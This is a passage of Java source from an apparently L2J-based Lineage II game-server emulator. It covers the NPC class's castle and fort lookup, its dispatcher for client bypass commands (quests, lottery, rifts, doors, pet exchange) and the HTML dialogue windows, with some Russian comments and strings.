			if (!_isInTown)
				_castleIndex = CastleManager.getInstance().getClosestCastle(this).getCastleId();
			else if (town != null && town.getCastle() != null)
				_castleIndex = town.getCastle().getCastleId();
			else
				_castleIndex = CastleManager.getInstance().getClosestCastle(this).getCastleId();
		}

		return CastleManager.getInstance().getCastleById(_castleIndex);
	}

	/** Return the L2Fort this L2NpcInstance belongs to. */
	public final Fort getFort()
	{
		// Get Fort this NPC belongs to (excluding L2Attackable)
		if (_fortIndex < 0)
		{
			Fort fort = FortManager.getInstance().getFort(getX(), getY(), getZ());
			if (fort != null)
			{
				_fortIndex = FortManager.getInstance().getFortIndex(fort.getFortId());
			}
			if (_fortIndex < 0)
			{
				_fortIndex = FortManager.getInstance().findNearestFortIndex(this);
			}
		}
		if (_fortIndex < 0)
		{
			return null;
		}
		return FortManager.getInstance().getForts().get(_fortIndex);
	}

	public final boolean getIsInTown()
	{
		if (_castleIndex < 0)
			getCastle();
		return _isInTown;
	}

	/**
	 * Open a quest or chat window on client with the text of the L2NpcInstance in function of the command.<BR><BR>
	 *
	 * <B><U> Example of use </U> :</B><BR><BR>
	 * <li> Client packet : RequestBypassToServer</li><BR><BR>
	 *
	 * @param command The command string received from client
	 *
	 */
	public void onBypassFeedback(L2PcInstance player, String command)
	{
		//if (canInteract(player))
		{
			if (isBusy() && getBusyMessage().length() > 0)
			{
				NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
				html.setFile("data/html/npcbusy.htm");
				html.replace("%busymessage%", getBusyMessage());
				html.replace("%npcname%", getName());
				html.replace("%playername%", player.getName());
				player.sendPacket(html);
			}
			else if (Config.ALLOW_WYVERN_UPGRADER && command.startsWith("upgrade") && player.getClan() != null && player.getClan().getHasCastle() != 0)
			{
				String type = command.substring(8);

				if (type.equalsIgnoreCase("wyvern"))
				{
					L2NpcTemplate wind = NpcTable.getInstance().getTemplate(PetDataTable.STRIDER_WIND_ID);
					L2NpcTemplate star = NpcTable.getInstance().getTemplate(PetDataTable.STRIDER_STAR_ID);
					L2NpcTemplate twilight = NpcTable.getInstance().getTemplate(PetDataTable.STRIDER_TWILIGHT_ID);

					L2Summon summon = player.getPet();
					L2NpcTemplate myPet = summon.getTemplate();

					if ((myPet.equals(wind) || myPet.equals(star) || myPet.equals(twilight)) && player.getAdena() >= 20000000
							&& (player.getInventory().getItemByObjectId(summon.getControlItemId()) != null))
					{
						int exchangeItem = PetDataTable.WYVERN_ID;
						if (!player.reduceAdena("PetUpdate", 20000000, this, true))
							return;
						player.getInventory().destroyItem("PetUpdate", summon.getControlItemId(), 1, player, this);

						try
						{
							int level = summon.getLevel();
							int chance = (level - 54) * 10;

							if (Rnd.nextInt(100) < chance)
							{
								ThreadPoolManager.getInstance().scheduleGeneral(new DestroyTemporalSummon(summon, player), 6000);
								player.addItem("PetUpdate", exchangeItem, 1, player, true, true);

								NpcHtmlMessage adminReply = new NpcHtmlMessage(getObjectId());
								TextBuilder replyMSG = new TextBuilder("<html><body>");
								replyMSG.append("Congratulations, the evolution suceeded.");
								replyMSG.append("</body></html>");
								adminReply.setHtml(replyMSG.toString());
								player.sendPacket(adminReply);
							}
							else
								summon.reduceCurrentHp(summon.getStatus().getCurrentHp(), player);

							ItemList il = new ItemList(player, true);
							player.sendPacket(il);
						}
						catch (Exception e)
						{
							e.printStackTrace();
						}
					}
					else
					{
						NpcHtmlMessage adminReply = new NpcHtmlMessage(getObjectId());
						TextBuilder replyMSG = new TextBuilder("<html><body>");

						replyMSG.append("You will need 20.000.000 and have the pet summoned for the ceremony ...");
						replyMSG.append("</body></html>");

						adminReply.setHtml(replyMSG.toString());
						player.sendPacket(adminReply);
					}
				}
			}
			else if (command.equalsIgnoreCase("TerritoryStatus"))
			{
				NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
				{
					if (getCastle().getOwnerId() > 0)
					{
						html.setFile("data/html/territorystatus.htm");
						L2Clan clan = ClanTable.getInstance().getClan(getCastle().getOwnerId());
						html.replace("%clanname%", clan.getName());
						html.replace("%clanleadername%", clan.getLeaderName());
					}
					else
						html.setFile("data/html/territorynoclan.htm");
				}
				html.replace("%castlename%", getCastle().getName());
				html.replace("%taxpercent%", "" + getCastle().getTaxPercent());
				html.replace("%objectId%", String.valueOf(getObjectId()));
				{
					if (getCastle().getCastleId() > 6)
						html.replace("%territory%", "Королевства Эльмор");
					else
						html.replace("%territory%", "Королевства Аден");
				}
				player.sendPacket(html);
			}
			else if (command.startsWith("Quest"))
			{
				String quest = "";
				try
				{
					quest = command.substring(5).trim();
				}
				catch (IndexOutOfBoundsException ioobe)
				{
				}

				if (quest.length() == 0)
					showQuestWindow(player);
				else
					showQuestWindow(player, quest);
			}
			else if (command.startsWith("Chat"))
			{
				int val = 0;
				try
				{
					val = Integer.parseInt(command.substring(5));
				}
				catch (IndexOutOfBoundsException ioobe)
				{
				}
				catch (NumberFormatException nfe)
				{
				}
				showChatWindow(player, val);
			}
			else if (command.startsWith("Link"))
			{
				String path="";
				try
				{
					path = command.substring(5).trim();
				}
				catch (IndexOutOfBoundsException ioobe)
				{
				}
				if (path.equalsIgnoreCase(""))
					return;
				if (path.indexOf("..") != -1)
					return;
				String filename = "data/html/" + path;
				NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
				html.setFile(filename);
				html.replace("%objectId%", String.valueOf(getObjectId()));
				player.sendPacket(html);
			}
			else if (command.startsWith("Loto"))
			{
				int val = 0;
				try
				{
					val = Integer.parseInt(command.substring(5));
				}
				catch (IndexOutOfBoundsException ioobe)
				{
				}
				catch (NumberFormatException nfe)
				{
				}
				if (val == 0)
				{
					// new loto ticket
					for (int i = 0; i < 5; i++)
						player.setLoto(i, 0);
				}
				showLotoWindow(player, val);
			}
			else if (command.startsWith("CPRecovery"))
				makeCPRecovery(player);
			else if (command.startsWith("SupportMagic"))
				makeSupportMagic(player,command);
			else if (command.startsWith("multisell"))
				L2Multisell.getInstance().separateAndSend(Integer.parseInt(command.substring(9).trim()), player, false, getCastle().getTaxRate());
			else if (command.startsWith("exc_multisell"))
				L2Multisell.getInstance().separateAndSend(Integer.parseInt(command.substring(13).trim()), player, true, getCastle().getTaxRate());
			else if (command.startsWith("Augment"))
			{
				int cmdChoice = Integer.parseInt(command.substring(8, 9).trim());
				switch (cmdChoice)
				{
				case 1:
					player.sendPacket(SystemMessageId.SELECT_THE_ITEM_TO_BE_AUGMENTED);
					player.sendPacket(new ExShowVariationMakeWindow());
					break;
				case 2:
					player.sendPacket(SystemMessageId.SELECT_THE_ITEM_FROM_WHICH_YOU_WISH_TO_REMOVE_AUGMENTATION);
					player.sendPacket(new ExShowVariationCancelWindow());
					break;
				}
			}
			else if (command.startsWith("EnterRift"))
			{
				try
				{
					Byte b1 = Byte.parseByte(command.substring(10)); // Selected Area: Recruit, Soldier etc
					DimensionalRiftManager.getInstance().start(player, b1, this);
				}
				catch (Exception e)
				{
				}
			}
			else if (command.startsWith("ChangeRiftRoom"))
			{
				if (player.isInParty() && player.getParty().isInDimensionalRift())
					player.getParty().getDimensionalRift().manualTeleport(player, this);
				else
					DimensionalRiftManager.getInstance().handleCheat(player, this);
			}
			else if (command.startsWith("ExitRift"))
			{
				if (player.isInParty() && player.getParty().isInDimensionalRift())
					player.getParty().getDimensionalRift().manualExitRift(player, this);
				else
					DimensionalRiftManager.getInstance().handleCheat(player, this);
			}
			else if (command.startsWith("remove_dp"))
			{
				int cmdChoice = Integer.parseInt(command.substring(10, 11).trim());
				int[] pen_clear_price = { 3600, 8640, 25200, 50400, 86400, 144000, 144000 };
				switch (cmdChoice)
				{
				case 1:
					String filename = "data/html/default/30981-1.htm";
					NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
					html.setFile(filename);
					html.replace("%objectId%", String.valueOf(getObjectId()));
					html.replace("%dp_price%", String.valueOf(pen_clear_price[player.getExpertiseIndex()]));
					player.sendPacket(html);
					break;
				case 2:
					NpcHtmlMessage Reply = new NpcHtmlMessage(getObjectId());
					TextBuilder replyMSG = new TextBuilder("<html><body>Black Judge:<br>");

					if (player.getDeathPenaltyBuffLevel() > 0)
					{
						if (player.getAdena() >= pen_clear_price[player.getExpertiseIndex()])
						{
							if (!player.reduceAdena("DeathPenality", pen_clear_price[player.getExpertiseIndex()], this, true))
								return;
							player.setDeathPenaltyBuffLevel(player.getDeathPenaltyBuffLevel() - 1);
							player.sendPacket(SystemMessageId.DEATH_PENALTY_LIFTED);
							player.sendEtcStatusUpdate();
							return;
						}

						replyMSG.append("The wound you have received from death's touch is too deep to be healed for the money you have to give me. Find more money if you wish death's mark to be fully removed from you.");
					}
					else
					{
						replyMSG.append("You have no more death wounds that require healing.<br>");
						replyMSG.append("Go forth and fight, both for this world and your own glory.");
					}

					replyMSG.append("</body></html>");
					Reply.setHtml(replyMSG.toString());
					player.sendPacket(Reply);
					break;
				}
			}
			else if (command.equals("questlist"))
				player.sendPacket(new ExQuestInfo());
			else if (command.equalsIgnoreCase("exchange"))
			{
				NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
				html.setFile("data/html/merchant/exchange.htm");
				html.replace("%objectId%", String.valueOf(getObjectId()));
				player.sendPacket(html);
			}
			else if (command.startsWith("petexchange"))
			{
				int cmdChoice = Integer.parseInt(command.substring(12, 13).trim());
				if (cmdChoice>0 && cmdChoice<9)
					exchangePetItem(player,cmdChoice);
			}			
			else if (command.startsWith("open_gate"))
			{
				final DoorTable _doorTable = DoorTable.getInstance();
				int doorId;

				StringTokenizer st = new StringTokenizer(command.substring(10), ", ");

				while (st.hasMoreTokens())
				{
					doorId = Integer.parseInt(st.nextToken());

					if (_doorTable.getDoor(doorId) != null)
					{
						_doorTable.getDoor(doorId).openMe();
						_doorTable.getDoor(doorId).onOpen();
					}
					else
						_log.warn("Door Id does not exist.(" + doorId + ")");
				}
				return;
			}
			//L2EMU_ADD_START - Charus: command to close a door
			else if (command.startsWith("close_gate"))
			{
				final DoorTable _doorTable = DoorTable.getInstance();
				int doorId;

				StringTokenizer st = new StringTokenizer(command.substring(10), ", ");

				while (st.hasMoreTokens())
				{
					doorId = Integer.parseInt(st.nextToken());

					if (_doorTable.getDoor(doorId) != null)
					{
						_doorTable.getDoor(doorId).closeMe();
						_doorTable.getDoor(doorId).onClose();
					}
					else
						_log.warn("Door Id does not exist.(" + doorId + ")");
				}
				return;
			}
			//For Decrease Character level
			else if (command.startsWith("GiveBlessing"))
			{
				if (player == null)
					return;

				if (player.getLevel() > 39 || player.getClassId().level() >= 2)
				{
					NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
					html.setFile("data/html/default/BlessingOfProtection-no.htm");
					player.sendPacket(html);
				}
				else
				{
					//targets playet
					setTarget(player);

					//gets the skill info
					L2Skill skill = SkillTable.getInstance().getInfo(5182, 1);
					if (skill != null)
						doCast(skill);
				}
			}
			//L2EMU_ADD
			// [J2J_JP ADD END]
			else if (command.startsWith("arena_info"))
			{
				NpcHtmlMessage htm = new NpcHtmlMessage(getObjectId());
				htm.setHtml(ArenaManager.getInstance().showHtm(player.getObjectId()));
				player.sendPacket(htm);
			}
			else if (command.startsWith("fisherman_info"))
			{
				NpcHtmlMessage htm = new NpcHtmlMessage(getObjectId());
				htm.setHtml(FishermanManager.getInstance().showHtm(player.getObjectId()));
				player.sendPacket(htm);
			}
			else if (command.startsWith("event"))
			{
				int val = 0;
				try
				{
					val = Integer.parseInt(command.substring(6));
				}
				catch (IndexOutOfBoundsException ioobe)
				{
				}
				catch (NumberFormatException nfe)
				{
				}
				if (val==0)
					return;
				if (getNpcId()==31228)
					EventMedals.exchangeItem(player,val);
				if (getNpcId()==31229)
					EventMedals.exchangeItem(player,val);
				if (getNpcId()==31230)
					EventMedals.exchangeItem(player,val);
				if (getNpcId()==31864)
					Cristmas.exchangeItem(player,val);
				if (getNpcId()==32130)
					L2day.exchangeItem(player,val);
				if (getNpcId()==31255)
					BigSquash.exchangeItem(player,val);
				if (getNpcId()==31855)
					StarlightFestival.exchangeItem(player,val);
				if (getNpcId()==35596)
					RainbowSpringSiege.getInstance().exchangeItem(player,val);
			}
			else if (command.startsWith("HotSpringsArena"))
			{
				if (!RainbowSpringSiege.getInstance().enterOnArena(player))
				{
					NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
					html.setFile("data/html/default/35603-no.htm");
					player.sendPacket(html);
				}
			}			
		}
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	/**
	 * Return null (regular NPCs don't have weapons instancies).<BR><BR>
	 */
	@Override
	public L2ItemInstance getActiveWeaponInstance()
	{
		// regular NPCs dont have weapons instancies
		return null;
	}

	/**
	 * Return the weapon item equiped in the right hand of the L2NpcInstance or null.<BR><BR>
	 */
	@Override
	public L2Weapon getActiveWeaponItem()
	{
		// Get the weapon identifier equiped in the right hand of the L2NpcInstance
		int weaponId = getTemplate().getRhand();

		if (weaponId < 1)
			return null;

		// Get the weapon item equiped in the right hand of the L2NpcInstance
		L2Item item = ItemTable.getInstance().getTemplate(getTemplate().getRhand());

		if (!(item instanceof L2Weapon))
			return null;

		return (L2Weapon) item;
	}

	/**
	 * Return null (regular NPCs don't have weapons instancies).<BR><BR>
	 */
	@Override
	public L2ItemInstance getSecondaryWeaponInstance()
	{
		// regular NPCs dont have weapons instancies
		return null;
	}

	/**
	 * Return the weapon item equiped in the left hand of the L2NpcInstance or null.<BR><BR>
	 */
	@Override
	public L2Weapon getSecondaryWeaponItem()
	{
		// Get the weapon identifier equiped in the right hand of the L2NpcInstance
		int weaponId = getTemplate().getLhand();

		if (weaponId < 1)
			return null;

		// Get the weapon item equiped in the right hand of the L2NpcInstance
		L2Item item = ItemTable.getInstance().getTemplate(getTemplate().getLhand());

		if (!(item instanceof L2Weapon))
			return null;

		return (L2Weapon) item;
	}

	/**
	 * Send a Server->Client packet NpcHtmlMessage to the L2PcInstance in order to display the message of the L2NpcInstance.<BR><BR>
	 *
	 * @param player The L2PcInstance who talks with the L2NpcInstance
	 * @param content The text of the L2NpcMessage
	 *
	 */
	public void insertObjectIdAndShowChatWindow(L2PcInstance player, String content)
	{
		// Send a Server->Client packet NpcHtmlMessage to the L2PcInstance in order to display the message of the L2NpcInstance
		content = content.replaceAll("%objectId%", String.valueOf(getObjectId()));
		NpcHtmlMessage npcReply = new NpcHtmlMessage(getObjectId());
		npcReply.setHtml(content);
		player.sendPacket(npcReply);
	}

	/**
	 * Return the pathfile of the selected HTML file in function of the npcId and of the page number.<BR><BR>
	 *
	 * <B><U> Format of the pathfile </U> :</B><BR><BR>
	 * <li> if the file exists on the server (page number = 0) : <B>data/html/default/12006.htm</B> (npcId-page number)</li>
	 * <li> if the file exists on the server (page number > 0) : <B>data/html/default/12006-1.htm</B> (npcId-page number)</li>
	 * <li> if the file doesn't exist on the server : <B>data/html/npcdefault.htm</B> (message : "I have nothing to say to you")</li><BR><BR>
	 *
	 * <B><U> Overridden in </U> :</B><BR><BR>
	 * <li> L2GuardInstance : Set the pathfile to data/html/guard/12006-1.htm (npcId-page number)</li><BR><BR>
	 *
	 * @param npcId The Identifier of the L2NpcInstance whose text must be display
	 * @param val The number of the page to display
	 *
	 */
	protected String getHtmlFolder() {
		return "default";
	}
	private String defdlg = null;
	public String getHtmlPath(int npcId, int val, L2PcInstance talker)
	{
		if(defdlg!=null)
			return defdlg;

		String pom = String.valueOf(npcId);

		if (val != 0)
			pom += "-" + val;

		String temp = "data/html/"+getHtmlFolder()+"/" + pom + ".htm";

		if (HtmCache.getInstance().pathExists(temp))
			return temp;
		temp = "data/html/"+talker.getLang()+"/"+getHtmlFolder()+"/" + pom + ".htm";
		if (HtmCache.getInstance().pathExists(temp))
			return temp;
		temp = "data/html/en/"+getHtmlFolder()+"/" + pom + ".htm";
		if (HtmCache.getInstance().pathExists(temp))
			return temp;
		
		// If the file is not found, the standard message "I have nothing to say to you" is returned
		if(Config.DEVELOPER)
			_log.warn("NPC: Using default dialog for "+getNpcId());
		defdlg = "data/html/npcdefault.htm"; 
		return defdlg;
	}

	/**
	 * Open a choose quest window on client with all quests available of the L2NpcInstance.<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance </li><BR><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 * @param quests The table containing quests of the L2NpcInstance
	 *
	 */
	public void showQuestChooseWindow(L2PcInstance player, Quest[] quests)
	{
		TextBuilder sb = new TextBuilder();
		//L2EMU_EDIT
		sb.append("<html><body>");
		//L2EMU_EDIT
		for (Quest q : quests)
		{
			sb.append("<a action=\"bypass -h npc_").append(getObjectId()).append("_Quest ").append(q.getName()).append("\"> [").append(q.getDescr());

			QuestState qs = player.getQuestState(q.getScriptName());
			if (qs != null)
			{
				if (qs.getState() == State.STARTED && qs.getInt("cond") > 0)
					sb.append(" (In progress)");
				else if (qs.getState() == State.COMPLETED)
					sb.append(" (Completed)");
			}
			sb.append("]</a><br>");
		}

		sb.append("</body></html>");

		// Send a Server->Client packet NpcHtmlMessage to the L2PcInstance in order to display the message of the L2NpcInstance
		insertObjectIdAndShowChatWindow(player, sb.toString());
	}

	/**
	 * Open a quest window on client with the text of the L2NpcInstance.<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Get the text of the quest state in the folder data/scripts/quests/questId/stateId.htm </li>
	 * <li>Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance </li>
	 * <li>Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet </li><BR><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 * @param questId The Identifier of the quest to display the message
	 *
	 */
	public void showQuestWindow(L2PcInstance player, String questId)
	{
		String content = null;

		Quest q = QuestManager.getInstance().getQuest(questId);

		// Get the state of the selected quest
		QuestState qs = player.getQuestState(questId);

		if (q == null)
		{
			// no quests found
			
			content = Message.getMessage(player, MessageId.MSG_NO_QUEST);
		}
		else
		{
			if ((q.getQuestIntId() >= 1 && q.getQuestIntId() < 1000)
					&& (player.getWeightPenalty() >= 3 || player.getInventoryLimit() * 0.8 <= player.getInventory().getSize()))
			{
				player.sendPacket(SystemMessageId.INVENTORY_LESS_THAN_80_PERCENT);
				return;
			}

			if (qs == null)
			{
				if (q.getQuestIntId() >= 1 && q.getQuestIntId() < 1000)
				{
					Quest[] questList = player.getAllActiveQuests();
					if (questList.length >= 25) // if too many ongoing quests, don't show window and send message
					{
						player.sendPacket(SystemMessageId.TOO_MANY_QUESTS);
						return;
					}
				}
				// check for start point
				Quest[] qlst = getTemplate().getEventQuests(Quest.QuestEventType.QUEST_START);

				if (qlst != null && qlst.length > 0)
				{
					for (Quest temp : qlst)
					{
						if (temp == q)
						{
							qs = q.newQuestState(player);
							break;
						}
					}
				}
			}
		}

		if (qs != null)
		{
			// If the quest is alreday started, no need to show a window
			if (!qs.getQuest().notifyTalk(this, qs))
				return;

			questId = qs.getQuest().getName();
			String stateId = State.getStateName(qs.getState());
			String path = "data/scripts/quests/" + questId + "/" + stateId + ".htm";
			content = HtmCache.getInstance().getHtm(path,player);

			if (_log.isDebugEnabled() || Config.DEBUG)
			{
				if (content != null)
				{
					_log.debug("Showing quest window for quest " + questId + " html path: " + path);
				}
				else
				{
					_log.debug("File not exists for quest " + questId + " html path: " + path);
				}
			}
		}

		// Send a Server->Client packet NpcHtmlMessage to the L2PcInstance in order to display the message of the L2NpcInstance
		if (content != null)
			insertObjectIdAndShowChatWindow(player, content);

		// Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	/**
	 * Collect awaiting quests/start points and display a QuestChooseWindow (if several available) or QuestWindow.<BR><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 *
	 */
	public void showQuestWindow(L2PcInstance player)
	{
		// collect awaiting quests and start points
		FastList<Quest> options = new FastList<Quest>();

		QuestState[] awaits = player.getQuestsForTalk(getTemplate().getNpcId());
		Quest[] starts = getTemplate().getEventQuests(Quest.QuestEventType.QUEST_START);

		// Quests are limited between 1 and 999 because those are the quests that are supported by the client.
		// By limitting them there, we are allowed to create custom quests at higher IDs without interfering
		if (awaits != null)
		{
			for (QuestState x : awaits)
			{
				if (!options.contains(x.getQuest()))
					if ((x.getQuest().getQuestIntId() > 0) && (x.getQuest().getQuestIntId() < 1000))
						options.add(x.getQuest());
			}
		}

		if (starts != null)
		{
			for (Quest x : starts)
			{
				if (!options.contains(x))
					if ((x.getQuestIntId() > 0) && (x.getQuestIntId() < 1000))
						options.add(x);
			}
		}

		// Display a QuestChooseWindow (if several quests are available) or QuestWindow
		if (options.size() > 1)
		{
			showQuestChooseWindow(player, options.toArray(new Quest[options.size()]));
		}
		else if (options.size() == 1)
		{
			showQuestWindow(player, options.get(0).getName());
		}
		else
		{
			showQuestWindow(player, "");
		}
	}

	/**
	 * Open a Loto window on client with the text of the L2NpcInstance.<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Get the text of the selected HTML file in function of the npcId and of the page number </li>
	 * <li>Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance </li>
	 * <li>Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet </li><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 * @param val The number of the page of the L2NpcInstance to display
	 *
	 */
	/**
	 * Open a Loto window on client with the text of the L2NpcInstance.<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Get the text of the selected HTML file in function of the npcId and of the page number </li>
	 * <li>Send a Server->Client NpcHtmlMessage containing the text of the L2NpcInstance to the L2PcInstance </li>
	 * <li>Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet </li><BR>
	 *
	 * @param player The L2PcInstance that talk with the L2NpcInstance
	 * @param val The number of the page of the L2NpcInstance to display
	 *
	 */
	// -1 - lottery instructions
	// 0 - first buy lottery ticket window
	// 1-20 - buttons
	// 21 - second buy lottery ticket window
	// 22 - selected ticket with 5 numbers
	// 23 - current lottery jackpot
	// 24 - Previous winning numbers/Prize claim
	// >24 - check lottery ticket by item object id
	public void showLotoWindow(L2PcInstance player, int val)
	{
		int npcId = getTemplate().getNpcId();
		String filename;
		SystemMessage sm;
		NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());

		if (val == 0) // 0 - first buy lottery ticket window
		{
			filename = (getHtmlPath(npcId, 1,player));
			html.setFile(filename);
		}
		else if (val >= 1 && val <= 21) // 1-20 - buttons, 21 - second buy lottery ticket window
		{
			if (!Lottery.getInstance().isStarted())
			{
				//tickets can't be sold
				player.sendPacket(SystemMessageId.NO_LOTTERY_TICKETS_CURRENT_SOLD);
				return;
			}
			if (!Lottery.getInstance().isSellableTickets())
			{
				//tickets can't be sold
				player.sendPacket(SystemMessageId.NO_LOTTERY_TICKETS_AVAILABLE);
				return;
			}

			filename = (getHtmlPath(npcId, 5,player));
			html.setFile(filename);

			int count = 0;
			int found = 0;
			// counting buttons and unsetting button if found
			for (int i = 0; i < 5; i++)
			{
				if (player.getLoto(i) == val)
				{
					//unsetting button
					player.setLoto(i, 0);
					found = 1;
				}
				else if (player.getLoto(i) > 0)
				{
					count++;
				}
			}

			//if not rearched limit 5 and not unseted value
			if (count < 5 && found == 0 && val <= 20)
				for (int i = 0; i < 5; i++)
					if (player.getLoto(i) == 0)
					{
						player.setLoto(i, val);
						break;
					}

			//setting pusshed buttons
			count = 0;
			for (int i = 0; i < 5; i++)
				if (player.getLoto(i) > 0)
				{
					count++;
					String button = String.valueOf(player.getLoto(i));
					if (player.getLoto(i) < 10)
						button = "0" + button;
					String search = "fore=\"L2UI.lottoNum" + button + "\" back=\"L2UI.lottoNum" + button + "a_check\"";
					String replace = "fore=\"L2UI.lottoNum" + button + "a_check\" back=\"L2UI.lottoNum" + button + "\"";
					html.replace(search, replace);
				}

			if (count == 5)
			{
				String search = "0\">Back";
				String replace = "22\">Confirm.";
				html.replace(search, replace);
			}
		}
		else if (val == 22) //22 - selected ticket with 5 numbers
		{
			if (!Lottery.getInstance().isStarted())
			{
				//tickets can't be sold
				player.sendPacket(SystemMessageId.NO_LOTTERY_TICKETS_CURRENT_SOLD);
				return;
			}
			if (!Lottery.getInstance().isSellableTickets())
			{
				//tickets can't be sold
				player.sendPacket(SystemMessageId.NO_LOTTERY_TICKETS_AVAILABLE);
				return;
			}

			int price = Config.ALT_LOTTERY_TICKET_PRICE;
			int lotonumber = Lottery.getInstance().getId();
			int enchant = 0;
			int type2 = 0;

			for (int i = 0; i < 5; i++)
			{
				if (player.getLoto(i) == 0)
					return;

				if (player.getLoto(i) < 17)
					enchant += Math.pow(2, player.getLoto(i) - 1);
				else
					type2 += Math.pow(2, player.getLoto(i) - 17);
			}
			if (player.getAdena() < price)
			{
				player.sendPacket(SystemMessageId.YOU_NOT_ENOUGH_ADENA);
				return;
			}
			if (!player.reduceAdena("Loto", price, this, true))
				return;
			Lottery.getInstance().increasePrize(price);

			sm = new SystemMessage(SystemMessageId.ACQUIRED_S1_S2);
			sm.addNumber(lotonumber);
			sm.addItemName(4442);
			player.sendPacket(sm);

			L2ItemInstance item = ItemTable.getInstance().createItem("Loto", 4442, 1, null); 
			item.setCustomType1(lotonumber);
			item.setEnchantLevel(enchant);
			item.setCustomType2(type2);
			player.getInventory().addItem("Loto", item, player, this);

			InventoryUpdate iu = new InventoryUpdate();
			iu.addItem(item);
			L2ItemInstance adenaupdate = player.getInventory().getItemByItemId(57);
			iu.addModifiedItem(adenaupdate);
			player.sendPacket(iu);

			filename = (getHtmlPath(npcId, 3,player));
			html.setFile(filename);
		}
		else if (val == 23) //23 - current lottery jackpot
		{
			filename = (getHtmlPath(npcId, 3,player));
			html.setFile(filename);
		}
		else if (val == 24) // 24 - Previous winning numbers/Prize claim
		{
			filename = (getHtmlPath(npcId, 4,player));
			html.setFile(filename);

			int lotonumber = Lottery.getInstance().getId();
			String message = "";
			for (L2ItemInstance item : player.getInventory().getItems())
			{
				if (item == null)
					continue;
				if (item.getItemId() == 4442 && item.getCustomType1() < lotonumber)
				{
					message = message + "<a action=\"bypass -h npc_%objectId%_Loto " + item.getObjectId() + "\">" + item.getCustomType1() + " Эвентовые Номера ";
					int[] numbers = Lottery.getInstance().decodeNumbers(item.getEnchantLevel(), item.getCustomType2());
					for (int i = 0; i < 5; i++)
					{
						message += numbers[i] + " ";
					}
					int[] check = Lottery.getInstance().checkTicket(item);
					if (check[0] > 0)
					{
						switch (check[0])
						{
						case 1:
							message += "- 1й приз";
							break;
						case 2:
							message += "- 2й приз";
							break;
						case 3:
							message += "- 3й приз";
							break;
						case 4:
							message += "- 4й приз";
							break;
						}
						message += " " + check[1] + "a.";
					}
					message += "</a><br>";
				}
			}
			if (message.isEmpty())
			{
				//L2EMU_EDIT_START
				message += "У Вас нет выигравших лоттерейных билетов.<br>";
				//L2EMU_EDIT_END
			}
			html.replace("%result%", message);
		}
		else if (val > 24) // >24 - check lottery ticket by item object id
		{
			int lotonumber = Lottery.getInstance().getId();
			L2ItemInstance item = player.getInventory().getItemByObjectId(val);
			if (item == null || item.getItemId() != 4442 || item.getCustomType1() >= lotonumber)
				return;
			int[] check = Lottery.getInstance().checkTicket(item);

			sm = new SystemMessage(SystemMessageId.S1_DISAPPEARED);
			sm.addItemName(4442);
			player.sendPacket(sm);

			int adena = check[1];
			if (adena > 0)
				player.addAdena("Loto", adena, this, true);
			player.destroyItem("Loto", item, this, false);
			return;
		}
		else if (val == -1) // -1 - Lottery Instrucions
		{
			filename = (getHtmlPath(npcId, 2,player));
			html.setFile(filename);
		}
		html.replace("%objectId%", String.valueOf(getObjectId()));
		html.replace("%race%", "" + Lottery.getInstance().getId());
		html.replace("%adena%", "" + Lottery.getInstance().getPrize());
		html.replace("%ticket_price%", "" + Config.ALT_LOTTERY_TICKET_PRICE);
		html.replace("%prize5%", "" + (Config.ALT_LOTTERY_5_NUMBER_RATE * 100));
		html.replace("%prize4%", "" + (Config.ALT_LOTTERY_4_NUMBER_RATE * 100));
		html.replace("%prize3%", "" + (Config.ALT_LOTTERY_3_NUMBER_RATE * 100));
		html.replace("%prize2%", "" + Config.ALT_LOTTERY_2_AND_1_NUMBER_PRIZE);
		html.replace("%enddate%", "" + DateFormat.getDateInstance().format(Lottery.getInstance().getEndDate()));
		player.sendPacket(html);

		// Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	public void exchangePetItem(L2PcInstance player ,int val)
	{
		int destroyItemID=0;
		int newItemID=0;
		switch (val)
		{
		case 1:  // Ожерелье Питомца: Рыжая Ласка
			destroyItemID=Config.PET_TICKET_ID;
			newItemID=13017;
			break;
		case 2: // Ожерелье Питомца: Принцесса Фей
			destroyItemID=Config.PET_TICKET_ID;
			newItemID=13018;
			break;
		case 3: // Ожерелье Питомца: Дикий Зверь Боец
			destroyItemID=Config.PET_TICKET_ID;
			newItemID=13019;
			break;
		case 4: // Ожерелье Питомца: Лис Шаман
			destroyItemID=Config.PET_TICKET_ID;
			newItemID=13020;
			break;
		case 5: // Ожерелье Питомца: Игрушечный Рыцарь
			destroyItemID=Config.SPECIAL_PET_TICKET_ID;
			newItemID=13548;
			break;
		case 6: // Ожерелье Питомца: Дух Мага
			destroyItemID=Config.SPECIAL_PET_TICKET_ID;
			newItemID=13549;
			break;
		case 7: // Ожерелье Питомца: Сова
			destroyItemID=Config.SPECIAL_PET_TICKET_ID;
			newItemID=13550;
			break;
		case 8: // Ожерелье Питомца: Черепаха
